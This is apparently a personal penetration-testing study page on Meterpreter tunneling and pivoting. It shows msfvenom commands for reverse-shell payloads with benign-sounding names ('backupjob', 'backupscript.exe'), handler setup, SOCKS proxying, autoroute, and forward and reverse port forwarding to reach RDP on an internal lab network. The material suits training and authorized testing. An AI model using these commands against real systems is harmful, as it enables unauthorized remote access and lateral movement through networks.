<li class="toctree-l1"><a class="reference internal" href="../../tags/Virtual%20Hosts.html">Virtual Hosts</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/WAF.html">WAF</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/wafw00f.html">wafw00f</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/wappalyzer.html">wappalyzer</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/web%20shells.html">web shells</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Webdav.html">Webdav</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/wget.html">wget</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/whatweb.html">whatweb</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/White%20Box%20Testing.html">White Box Testing</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/whois.html">whois</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/windapsearch.html">windapsearch</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20CMD.html">Windows CMD</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Lateral%20Movement.html">Windows Lateral Movement</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Local%20Password%20Attacks.html">Windows Local Password Attacks</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Pass%20The%20Hash.html">Windows Pass The Hash</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Pass%20The%20Ticket.html">Windows Pass The Ticket</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/Windows%20Passwords.html">Windows Passwords</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/winrm.html">winrm</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/WMI.html">WMI</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/wmiexec.py.html">wmiexec.py</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/wpscan.html">wpscan</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/xfreerdp.html">xfreerdp</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../tags/xxd.html">xxd</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../../index.html">Celestial Security Reference</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
      <li class="breadcrumb-item active">Meterpreter Tunneling and Port Forwarding</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../../_sources/CPTS/Initial Access/Meterpreter Tunneling and Port Forwarding.rst.txt" rel="nofollow"> View page source</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="meterpreter-tunneling-and-port-forwarding">
<h1>Meterpreter Tunneling and Port Forwarding<a class="headerlink" href="#meterpreter-tunneling-and-port-forwarding" title="Link to this heading"></a></h1>
<p>Date: 2024-11-02 14:33</p>
<p>Status:</p>
<p>Tags:</p>
<section id="description">
<h2>Description<a class="headerlink" href="#description" title="Link to this heading"></a></h2>
<p>There are situation where you may want to drop a shell on the pivot host instead of using SSH</p>
</section>
<section id="creating-a-shell-on-the-pivot-host">
<h2>Creating a shell on the pivot host<a class="headerlink" href="#creating-a-shell-on-the-pivot-host" title="Link to this heading"></a></h2>
<p>Step 1. Create the shell and upload it to the pivot host</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080</span>

<span class="go">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span>
<span class="go">[-] No arch selected, selecting arch: x64 from the payload</span>
<span class="go">No encoder specified, outputting raw payload</span>
<span class="go">Payload size: 130 bytes</span>
<span class="go">Final size of elf file: 250 bytes</span>
<span class="go">Saved as: backupjob</span>
</pre></div>
</div>
<p>Step 2: Configure and start the multi handler</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf6 &gt; use exploit/multi/handler</span>

<span class="go">[*] Using configured payload generic/shell_reverse_tcp</span>
<span class="go">msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0</span>
<span class="go">lhost =&gt; 0.0.0.0</span>
<span class="go">msf6 exploit(multi/handler) &gt; set lport 8080</span>
<span class="go">lport =&gt; 8080</span>
<span class="go">msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp</span>
<span class="go">payload =&gt; linux/x64/meterpreter/reverse_tcp</span>
<span class="go">msf6 exploit(multi/handler) &gt; run</span>
<span class="go">[*] Started reverse TCP handler on 0.0.0.0:8080</span>
</pre></div>
</div>
<p>step 3: Run the shell on the pivot server</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">ubuntu@WebServer:~$ </span>ls

<span class="go">backupjob</span>
<span class="gp">ubuntu@WebServer:~$ </span>chmod<span class="w"> </span>+x<span class="w"> </span>backupjob
<span class="gp">ubuntu@WebServer:~$ </span>./backupjob
</pre></div>
</div>
<p>Now that we are connected to the pivot host via the created shell, we can scan that network.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">meterpreter &gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</span>

<span class="go">[*] Performing ping sweep for IP range 172.16.5.0/23</span>
</pre></div>
</div>
</section>
<section id="configuring-msf-s-socks-proxy">
<h2>Configuring MSF’s SOCKS Proxy<a class="headerlink" href="#configuring-msf-s-socks-proxy" title="Link to this heading"></a></h2>
<p><strong>Setup</strong></p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf6 &gt; use auxiliary/server/socks_proxy</span>

<span class="go">msf6 auxiliary(server/socks_proxy) &gt; set SRVPORT 9050</span>
<span class="go">SRVPORT =&gt; 9050</span>
<span class="go">msf6 auxiliary(server/socks_proxy) &gt; set SRVHOST 0.0.0.0</span>
<span class="go">SRVHOST =&gt; 0.0.0.0</span>
<span class="go">msf6 auxiliary(server/socks_proxy) &gt; set version 4a</span>
<span class="go">version =&gt; 4a</span>
<span class="go">msf6 auxiliary(server/socks_proxy) &gt; run</span>
<span class="go">[*] Auxiliary module running as background job 0.</span>

<span class="go">[*] Starting the SOCKS proxy server</span>
<span class="go">msf6 auxiliary(server/socks_proxy) &gt; options</span>

<span class="go">Module options (auxiliary/server/socks_proxy):</span>

<span class="go">Name     Current Setting  Required  Description</span>
<span class="go">----     ---------------  --------  -----------</span>
<span class="go">SRVHOST  0.0.0.0          yes       The address to listen on</span>
<span class="go">SRVPORT  9050             yes       The port to listen on</span>
<span class="go">VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,</span>
<span class="go">                                        5)</span>


<span class="go">Auxiliary action:</span>

<span class="go">Name   Description</span>
<span class="go">----   -----------</span>
<span class="go">Proxy  Run a SOCKS proxy server</span>
</pre></div>
</div>
<p><strong>Verify Running</strong></p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf6 auxiliary(server/socks_proxy) &gt; jobs</span>

<span class="go">Jobs</span>
<span class="go">====</span>

<span class="go">Id  Name                           Payload  Payload opts</span>
<span class="go">--  ----                           -------  ------------</span>
<span class="go">0   Auxiliary: server/socks_proxy</span>
</pre></div>
</div>
<p><strong>Setup proxy chains</strong></p>
<p>Ensure your config file reflects your port</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">socks4      127.0.0.1 9050</span>
</pre></div>
</div>
<p>Finally tell the SOCKS module to route all traffic via our Meterpreter session.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msf6 &gt; use post/multi/manage/autoroute</span>

<span class="go">msf6 post(multi/manage/autoroute) &gt; set SESSION 1</span>
<span class="go">SESSION =&gt; 1</span>
<span class="go">msf6 post(multi/manage/autoroute) &gt; set SUBNET 172.16.5.0</span>
<span class="go">SUBNET =&gt; 172.16.5.0</span>
<span class="go">msf6 post(multi/manage/autoroute) &gt; run</span>

<span class="go">[!] SESSION may not be compatible with this module:</span>
<span class="go">[!]  * incompatible session platform: linux</span>
<span class="go">[*] Running module against 10.129.202.64</span>
<span class="go">[*] Searching for subnets to autoroute.</span>
<span class="go">[+] Route added to subnet 10.129.0.0/255.255.0.0 from host&#39;s routing table.</span>
<span class="go">[+] Route added to subnet 172.16.5.0/255.255.254.0 from host&#39;s routing table.</span>
<span class="go">[*] Post module execution completed</span>
</pre></div>
</div>
<p>It is also possible to add routes with <cite>autoroute</cite> by running autoroute from the Meterpreter session.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">meterpreter &gt; run autoroute -s 172.16.5.0/23</span>

<span class="go">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span>
<span class="go">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span>
<span class="go">[*] Adding a route to 172.16.5.0/255.255.254.0...</span>
<span class="go">[+] Added route to 172.16.5.0/255.255.254.0 via 10.129.202.64</span>
<span class="go">[*] Use the -p option to list all active routes</span>
</pre></div>
</div>
</section>
<section id="listing-active-routes-with-autoroute">
<h2>Listing active routes with Autoroute<a class="headerlink" href="#listing-active-routes-with-autoroute" title="Link to this heading"></a></h2>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">meterpreter &gt; run autoroute -p</span>

<span class="go">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span>
<span class="go">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span>

<span class="go">Active Routing Table</span>
<span class="go">====================</span>

<span class="go">Subnet             Netmask            Gateway</span>
<span class="go">------             -------            -------</span>
<span class="go">10.129.0.0         255.255.0.0        Session 1</span>
<span class="go">172.16.4.0         255.255.254.0      Session 1</span>
<span class="go">172.16.5.0         255.255.254.0      Session 1</span>
</pre></div>
</div>
</section>
<section id="testing-the-proxychain-config">
<h2>Testing the proxychain config<a class="headerlink" href="#testing-the-proxychain-config" title="Link to this heading"></a></h2>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn</span>
</pre></div>
</div>
</section>
<section id="port-forwarding-with-msf">
<h2>Port Forwarding with MSF<a class="headerlink" href="#port-forwarding-with-msf" title="Link to this heading"></a></h2>
<p>There is a module in msf that forwards ports.  We can use the shell on the remote host and forward ports.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">meterpreter &gt; help portfwd</span>

<span class="go">Usage: portfwd [-h] [add | delete | list | flush] [args]</span>


<span class="go">OPTIONS:</span>

<span class="go">    -h        Help banner.</span>
<span class="go">    -i &lt;opt&gt;  Index of the port forward entry to interact with (see the &quot;list&quot; command).</span>
<span class="go">    -l &lt;opt&gt;  Forward: local port to listen on. Reverse: local port to connect to.</span>
<span class="go">    -L &lt;opt&gt;  Forward: local host to listen on (optional). Reverse: local host to connect to.</span>
<span class="go">    -p &lt;opt&gt;  Forward: remote port to connect to. Reverse: remote port to listen on.</span>
<span class="go">    -r &lt;opt&gt;  Forward: remote host to connect to.</span>
<span class="go">    -R        Indicates a reverse port forward.</span>
</pre></div>
</div>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">meterpreter &gt; portfwd add -l 3300 -p 3389 -r 172.16.5.19</span>

<span class="go">[*] Local TCP relay created: :3300 &lt;-&gt; 172.16.5.19:3389</span>
</pre></div>
</div>
<p>The above command requests the Meterpreter session to start a listener on our attack host’s local port (-l) 3300 and forward all the packets to the remote (-r) Windows server 172.16.5.19 on 3389 port (-p) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.</p>
</section>
<section id="meterpreter-reverse-port-forwarding">
<h2>Meterpreter Reverse Port Forwarding<a class="headerlink" href="#meterpreter-reverse-port-forwarding" title="Link to this heading"></a></h2>
<p>Similar to local port forwards, Metasploit can also perform reverse port forwarding with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port 1234 to our listener on port 8081.</p>
<p>We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port 1234 running on the Ubuntu server to our attack host on local port (-l) 8081. We will also configure our listener to listen on port 8081 for a Windows shell.</p>
<p>Step 1.  Reverse port forwarding rules</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L 10.10.14.18</span>

<span class="go">[*] Local TCP relay created: 10.10.14.18:8081 &lt;-&gt; :1234</span>
</pre></div>
</div>
<p>Step 2: Configure and starting multi/handler</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">meterpreter &gt; bg</span>

<span class="go">[*] Backgrounding session 1...</span>
<span class="go">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span>
<span class="go">payload =&gt; windows/x64/meterpreter/reverse_tcp</span>
<span class="go">msf6 exploit(multi/handler) &gt; set LPORT 8081</span>
<span class="go">LPORT =&gt; 8081</span>
<span class="go">msf6 exploit(multi/handler) &gt; set LHOST 0.0.0.0</span>
<span class="go">LHOST =&gt; 0.0.0.0</span>
<span class="go">msf6 exploit(multi/handler) &gt; run</span>

<span class="go">[*] Started reverse TCP handler on 0.0.0.0:8081</span>
</pre></div>
</div>
<p>We can now create a reverse shell payload that will send a connection back to our Ubuntu server on 172.16.5.129:1234 when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to attack host’s ip:8081 that we configured.</p>
</section>
<section id="generating-the-windows-payload">
<h2>Generating the Windows payload<a class="headerlink" href="#generating-the-windows-payload" title="Link to this heading"></a></h2>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234</span>
</pre></div>
</div>
<p>Finally if we execute this payload on the Windows server we should get a shell via the pivot server.</p>
</section>
</section>


           </div>
          </div>
          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Footer">
        <a href="Remote-Reverse%20Port%20Forwarding%20with%20SSH.html" class="btn btn-neutral float-left" title="Remote-Reverse Port Forwarding with SSH" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Previous</a>
        <a href="Socat%20Redirection%20with%20a%20Reverse%20Shell.html" class="btn btn-neutral float-right" title="Socat Redirection with a Reverse Shell" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
    </div>

  <hr/>

  <div role="contentinfo">
    <p>&#169; Copyright 2024, CelestialTech.ca.</p>
  </div>

  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
    provided by <a href="https://readthedocs.org">Read the Docs</a>.
   

</footer>
        </div>
      </div>
    </section>
  </div>
  <script>
      jQuery(function () {
          SphinxRtdTheme.Navigation.enable(true);
      });
  </script> 

</body>
</html>